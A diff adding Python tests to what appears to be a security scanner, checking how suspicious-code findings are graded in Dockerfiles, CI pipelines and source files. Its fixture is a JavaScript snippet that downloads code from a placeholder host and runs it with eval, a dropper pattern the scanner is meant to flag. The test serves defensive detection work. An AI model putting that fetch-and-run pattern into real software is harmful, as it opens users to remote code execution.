@@ -43,3 +43,67 @@ class TestHardeningTier:
     def test_the_stricter_merge_keeps_hardening_on(self) -> None:
         merged = ConfigParser._stricter_policy(Policy(hardening=True), Policy())
         assert merged.hardening
+
+
+class BuildDefinitionHelpers:
+    #: A file that downloads and evaluates code: what any rule reads as a dropper.
+    FETCH_AND_RUN = (
+        'const https = require("https");\n'
+        'https.get("https://releases.example.invalid/tool.js", (res) => {\n'
+        '  let body = "";\n'
+        '  res.on("data", (part) => (body += part));\n'
+        '  res.on("end", () => eval(body));\n'
+        "});\n"
+    )
+
+    @staticmethod
+    def suspicious(tmp_path):
+        from cordon_scanner.core.models import Category
+
+        (tmp_path / "fetch.js").write_text(BuildDefinitionHelpers.FETCH_AND_RUN, encoding="utf-8")
+        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
+        found = [
+            f
+            for f in result.findings
+            if f.category is Category.SUSPICIOUS and f.severity > Severity.LOW
+        ]
+        assert found, "the fixture has to produce a finding above LOW"
+        return found[0]
+
+    @staticmethod
+    def graded(finding, path: str, policy: Policy) -> Severity:
+        from cordon_scanner.core.engine import Engine
+
+        moved = replace(finding, location=replace(finding.location, path=path))
+        [out] = Engine._hardening_tier([moved], policy)
+        return out.severity
+
+
+class TestBuildDefinitions:
+    """A generic code finding in a container build file or a pipeline is posture, not an attack."""
+
+    def test_in_a_dockerfile_of_any_name_it_is_recorded(self, tmp_path) -> None:
+        finding = BuildDefinitionHelpers.suspicious(tmp_path)
+        for path in ("Dockerfile", "ci/docker/ubuntu-24.04.Dockerfile", "a.tgz!x/Containerfile"):
+            assert BuildDefinitionHelpers.graded(finding, path, Policy()) is Severity.LOW
+
+    def test_in_a_pipeline_it_is_recorded(self, tmp_path) -> None:
+        finding = BuildDefinitionHelpers.suspicious(tmp_path)
+        for path in (".github/workflows/release.yml", "ci/.gitlab-ci.yml", "Jenkinsfile"):
+            assert BuildDefinitionHelpers.graded(finding, path, Policy()) is Severity.LOW
+
+    def test_in_source_it_keeps_its_grade(self, tmp_path) -> None:
+        finding = BuildDefinitionHelpers.suspicious(tmp_path)
+        for path in ("lib/fetch.js", "docker/entrypoint.sh", ".github/scripts/fetch.js"):
+            assert BuildDefinitionHelpers.graded(finding, path, Policy()) is finding.severity
+
+    def test_with_hardening_it_keeps_its_grade(self, tmp_path) -> None:
+        finding = BuildDefinitionHelpers.suspicious(tmp_path)
+        graded = BuildDefinitionHelpers.graded(finding, "Dockerfile", Policy(hardening=True))
+        assert graded is finding.severity
+
+    def test_a_malicious_finding_is_never_lowered(self, tmp_path) -> None:
+        from cordon_scanner.core.models import Category
+
+        finding = replace(BuildDefinitionHelpers.suspicious(tmp_path), category=Category.MALICIOUS)
+        assert BuildDefinitionHelpers.graded(finding, "Dockerfile", Policy()) is finding.severity
